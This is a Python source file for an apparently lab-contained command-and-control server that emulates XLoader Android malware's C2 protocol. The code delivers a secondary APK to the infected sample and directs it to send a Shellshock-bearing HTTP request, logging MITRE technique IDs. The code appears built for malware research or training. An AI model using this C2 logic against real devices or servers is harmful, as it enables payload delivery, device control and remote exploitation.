from __future__ import annotations

import argparse
import hashlib
from pathlib import Path
import socket
import threading
from dataclasses import dataclass, field
from typing import Any

from servers.common.config import ensure_runtime_directories, lab_path, load_config, runtime_log_path
from servers.common.events import EventLog
from servers.common.msgpack_codec import MessagePackError, pack, unpack
from servers.common.rfc6455 import (
    FrameError,
    MessageAssembler,
    OP_BINARY,
    OP_CLOSE,
    OP_PING,
    OP_PONG,
    OP_TEXT,
    read_frame,
    send_frame,
)


class ScenarioError(RuntimeError):
    pass


@dataclass
class PendingRequest:
    event: threading.Event = field(default_factory=threading.Event)
    response: dict[str, Any] | None = None


class C2Session:
    def __init__(self, connection: socket.socket, peer: tuple[str, int], config: dict[str, Any], event_log: EventLog):
        self.connection = connection
        self.peer = peer
        self.config = config
        self.event_log = event_log
        self.send_lock = threading.Lock()
        self.pending_lock = threading.Lock()
        self.pending: dict[int, PendingRequest] = {}
        self.next_server_id = 9000
        self.apk_sent = threading.Event()
        self.closed = threading.Event()
        self.reader_failure: BaseException | None = None
        self.apk_bytes = lab_path(config["scenario"]["secondary_apk"]).read_bytes()

    def start_reader(self) -> threading.Thread:
        thread = threading.Thread(target=self._reader_loop, name="xloader-c2-reader", daemon=True)
        thread.start()
        return thread

    def _reader_loop(self) -> None:
        assembler = MessageAssembler()
        try:
            while not self.closed.is_set():
                frame = read_frame(self.connection, require_mask=True)
                assembled = assembler.accept(frame)
                if assembled is None:
                    continue
                opcode, payload = assembled
                if opcode == OP_PING:
                    self.event_log.emit("ping_received", payload=payload)
                    self._send_frame(payload, opcode=OP_PONG)
                    continue
                if opcode == OP_PONG:
                    self.event_log.emit("pong_received", payload=payload)
                    continue
                if opcode == OP_CLOSE:
                    self.event_log.emit("close_received", payload=payload)
                    self.closed.set()
                    break
                if opcode == OP_TEXT:
                    raise FrameError("XLoader no debe enviar mensajes de texto en este canal")
                if opcode != OP_BINARY:
                    raise FrameError(f"Opcode inesperado: {opcode}")
                message = unpack(payload)
                if not isinstance(message, dict):
                    raise MessagePackError("El RPC debe ser un mapa MessagePack")
                self.event_log.emit("rpc_received", peer=self.peer, rpc=message)
                self._dispatch(message)
        except (EOFError, OSError) as error:
            if not self.closed.is_set():
                self.reader_failure = error
                self.event_log.emit("connection_lost", error=repr(error))
        except BaseException as error:
            self.reader_failure = error
            self.event_log.emit("reader_error", error=repr(error))
        finally:
            self.closed.set()
            with self.pending_lock:
                for pending in self.pending.values():
                    pending.event.set()

    def _dispatch(self, message: dict[str, Any]) -> None:
        if "method" in message:
            self._handle_client_request(message)
            return
        if "result" in message or "error" in message:
            request_id = message.get("id")
            if isinstance(request_id, int):
                with self.pending_lock:
                    pending = self.pending.get(request_id)
                if pending is not None:
                    pending.response = message
                    pending.event.set()
            return
        self.event_log.emit("rpc_ignored", reason="unknown shape", rpc=message)

    def _handle_client_request(self, request: dict[str, Any]) -> None:
        method = request.get("method")
        request_id = request.get("id")
        params = request.get("params", [])
        if not isinstance(method, str):
            self._send_error(request_id, -32600, "Invalid Request")
            return
        if method == "hello":
            result: Any = None
        elif method == "getSmsKW":
            result = []
        elif method in ("is_call_rec_enable", "is_show_fs_float_window"):
            result = False
        elif method == "getPkgMap":
            package = self.config["scenario"]["secondary_package"]
            result = [pack({package: "*"})]
        elif method == "getPkgData":
            expected = self.config["scenario"]["secondary_package"]
            if not isinstance(params, list) or params != [expected]:
                self._send_error(request_id, -32602, "Unexpected package requested")
                return
            result = [self.apk_bytes]
        else:
            result = None
            self.event_log.emit("safe_default_response", method=method, params=params)
        if request_id is not None:
            self._send_rpc({"jsonrpc": "2.0", "id": request_id, "result": result})
        if method == "getPkgData":
            self.event_log.emit(
                "secondary_apk_delivered",
                package=self.config["scenario"]["secondary_package"],
                length=len(self.apk_bytes),
                sha256=hashlib.sha256(self.apk_bytes).hexdigest(),
            )
            self.apk_sent.set()

    def _send_error(self, request_id: Any, code: int, message: str) -> None:
        if request_id is None:
            return
        self._send_rpc(
            {
                "jsonrpc": "2.0",
                "id": request_id,
                "error": {"code": code, "message": message},
            }
        )

    def send_request(self, method: str, params: list[Any]) -> PendingRequest:
        with self.pending_lock:
            self.next_server_id += 1
            request_id = self.next_server_id
            pending = PendingRequest()
            self.pending[request_id] = pending
        self._send_rpc({"jsonrpc": "2.0", "method": method, "id": request_id, "params": params})
        return pending

    def _send_rpc(self, message: dict[str, Any]) -> None:
        payload = pack(message)
        self._send_frame(payload, opcode=OP_BINARY)
        self.event_log.emit("rpc_sent", peer=self.peer, rpc=message, frame_length=len(payload))

    def _send_frame(self, payload: bytes, *, opcode: int) -> None:
        with self.send_lock:
            send_frame(self.connection, payload, opcode=opcode)

    def close(self) -> None:
        if not self.closed.is_set():
            try:
                self._send_frame(b"", opcode=OP_CLOSE)
            except OSError:
                pass
        self.closed.set()
        try:
            self.connection.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
        self.connection.close()


def validate_http_result(response: dict[str, Any], config: dict[str, Any]) -> None:
    if "error" in response:
        raise ScenarioError(f"Android devolvió un error RPC: {response['error']!r}")
    result = response.get("result")
    if not isinstance(result, list) or len(result) != 3:
        raise ScenarioError(f"Forma inesperada de la respuesta http: {result!r}")
    status, headers, body = result
    expected_body = config["scenario"]["shellshock_body"].encode("ascii")
    if status != 200:
        raise ScenarioError(f"Estado HTTP inesperado: {status!r}")
    if not isinstance(headers, dict):
        raise ScenarioError("Las cabeceras HTTP no llegaron como mapa")
    if body != expected_body:
        raise ScenarioError(f"Cuerpo HTTP inesperado: {body!r}")


def run_scenario(session: C2Session, *, auto_continue: bool, continue_file: Path | None) -> None:
    scenario = session.config["scenario"]
    wait_for_apk = int(scenario["wait_for_apk_seconds"])
    print(f"Esperando getPkgData durante un máximo de {wait_for_apk} segundos...")
    if not session.apk_sent.wait(wait_for_apk):
        raise ScenarioError(
            "La muestra no solicitó la APK. Compruebe que /sdcard/.update2/ está limpio, "
            "que lab.xloader.secondary no está instalado y revise el RPC getPkgMap en logs/c2.jsonl."
        )
    if scenario.get("operator_gate", True) and not auto_continue:
        if continue_file is None:
            raise ScenarioError("Falta --continue-file para la confirmación del operador")
        timeout = int(scenario.get("wait_for_operator_seconds", 900))
        print(f"APK enviada. Esperando la confirmación del operador en {continue_file}...")
        if not _wait_for_marker(continue_file, timeout, session.closed):
            raise ScenarioError(f"No llegó la confirmación del operador en {timeout} segundos")
    params = [
        scenario["shellshock_url"],
        scenario["shellshock_method"],
        {"User-Agent": [scenario["shellshock_user_agent"]]},
        b"",
    ]
    session.event_log.emit("shellshock_rpc_start", params=params)
    pending = session.send_request("http", params)
    timeout = int(scenario["wait_for_http_seconds"])
    if not pending.event.wait(timeout):
        raise ScenarioError(f"No llegó la respuesta RPC http en {timeout} segundos")
    if pending.response is None:
        raise ScenarioError(f"La conexión se cerró antes de recibir la respuesta: {session.reader_failure!r}")
    validate_http_result(pending.response, session.config)
    session.event_log.emit(
        "scenario_complete",
        techniques=["T1481.001", "T1509", "T1407", "T1604", "T1428"],
        http_response=pending.response,
    )
    print("Escenario completado: la respuesta Shellshock emulada volvió correctamente por el C2.")


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(description="C2 local y restringido para el flujo de XLoader")
    parser.add_argument(
        "--auto-continue",
        action="store_true",
        help="No esperar a INTRO después de entregar la APK (pensado para pruebas automatizadas)",
    )
    parser.add_argument(
        "--continue-file",
        type=Path,
        help="Fichero que el operador crea tras completar la instalación de la APK",
    )
    return parser.parse_args()


def _wait_for_marker(path: Path, timeout: int, closed: threading.Event) -> bool:
    deadline = threading.Event()
    for _ in range(timeout * 4):
        if path.is_file():
            return True
        if closed.is_set():
            return False
        deadline.wait(0.25)
    return False


def main() -> None:
    args = parse_args()
    config = load_config()
    ensure_runtime_directories(config)
    apk_path = lab_path(config["scenario"]["secondary_apk"])
    if not apk_path.is_file():
        raise SystemExit(f"No existe la APK secundaria incluida en el laboratorio: {apk_path}.")
    host = config["network"]["c2_host"]
    port = int(config["network"]["c2_port"])
    event_log = EventLog(runtime_log_path("c2.jsonl"), "c2")
    listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listener.bind((host, port))
    listener.listen(1)
    event_log.emit(
        "listening",
        host=host,
        port=port,
        transport="RFC6455 frames directly over TCP; no HTTP handshake",
    )
    session: C2Session | None = None
    try:
        connection, peer = listener.accept()
        connection.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        event_log.emit("client_connected", peer=peer)
        session = C2Session(connection, peer, config, event_log)
        session.start_reader()
        run_scenario(session, auto_continue=args.auto_continue, continue_file=args.continue_file)
    except KeyboardInterrupt:
        event_log.emit("stopping", reason="keyboard interrupt")
    except BaseException as error:
        event_log.emit("scenario_failed", error=repr(error))
        raise
    finally:
        if session is not None:
            session.close()
        listener.close()


if __name__ == "__main__":
    main()
